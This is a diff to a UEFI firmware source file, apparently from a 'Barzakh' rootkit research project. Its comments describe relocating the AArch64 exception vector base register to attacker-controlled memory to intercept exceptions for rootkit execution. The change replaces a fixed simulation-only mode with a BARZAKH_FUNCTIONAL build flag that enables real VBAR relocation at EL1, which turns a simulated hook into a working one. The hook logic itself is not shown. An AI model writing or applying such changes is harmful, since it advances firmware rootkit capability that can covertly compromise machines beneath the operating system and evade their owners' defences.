@@ -6,7 +6,8 @@
   each 0x80 bytes. By relocating VBAR to attacker-controlled memory,
   all exceptions can be intercepted for rootkit execution.
 
-  All operations are SIMULATED - no actual VBAR registers are modified.
+  When BARZAKH_FUNCTIONAL is defined, the module performs real VBAR
+  relocation on AArch64 (EL1). Otherwise all operations are SIMULATED.
 
   Copyright (c) 2026, Barzakh Research Project
   SPDX-License-Identifier: BSD-2-Clause-Patent
@@ -23,7 +24,11 @@
 #include <Library/PrintLib.h>
 #include <Library/UefiBootServicesTableLib.h>
 
-#define SIMULATION_MODE  TRUE
+#ifdef BARZAKH_FUNCTIONAL
+  #define SIMULATION_MODE  FALSE
+#else
+  #define SIMULATION_MODE  TRUE
+#endif
 
 #define VHOOK_DEBUG_PREFIX  "[VecHook-Emu] "
 
